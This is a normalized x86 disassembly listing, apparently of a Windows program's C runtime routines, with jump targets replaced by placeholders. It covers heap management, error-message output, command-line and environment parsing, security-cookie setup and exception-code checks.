jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_418538
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_41814f
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_41809f
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_41881d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_41dee7
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_41dee7
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_410680
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_413c11
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40eccc
add esp 0x14
push esi
call sub_410680
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_413c11
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_410680
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_41a235
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40eccc
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_41ac05
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40eccc
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_40eccc
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_41dd7e
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40eccc
add esp 0x14
push r--data
push ebx
push edi
call sub_41ac05
add esp 0xc
test eax eax
je r-xdata
sub_4189c8
push 0x3
call sub_41dee7
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_41881d
push 0xff
call sub_41881d
pop ecx
pop ecx
push 0x3
call sub_41dee7
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_418a01
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_419c56
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_418a51
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_4130d7
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_413f18
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_410680
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_410680
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_410135
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_413f18
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_410135
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_413c11
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40eccc
add esp 0x14
sub_418b2f
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_4172f4
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_4172f4
pop ecx
test eax eax
je r-xdata
call sub_4172f4
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_418cc9
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_4130d7
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_418b2f
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_413ed3
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_418b2f
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_418d84
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_413ed3
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_413ed3
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_4158c0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_410135
pop ecx
mov [ ebp - 0x4 ] ebx
sub_418ebb
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_418ee1
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_418f07
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_418f9d
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_40e7e0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_418fc6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40e8ad
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40f2fb
pop ecx
sub_418fed
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_417200
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_41904c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_41371e
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
call sub_41371e
add eax 0x90
dec [ eax ]
call sub_41371e
and [ eax + 0x90 ] 0x0
jmp sub_419c56
sub_419095
push 0x10
push r--data
call sub_4143e0
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41915b
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_41371e
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_414425
retn
call sub_419ca2
call sub_419ca2
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_419cf0
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_419176
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_41371e
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_4191bb
push 0x8
push r--data
call sub_4143e0
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_414425
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_410789
mov [ ebp - 0x4 ] 0xfffffffe
sub_419210
mov edi edi
push ebp
mov ebp esp
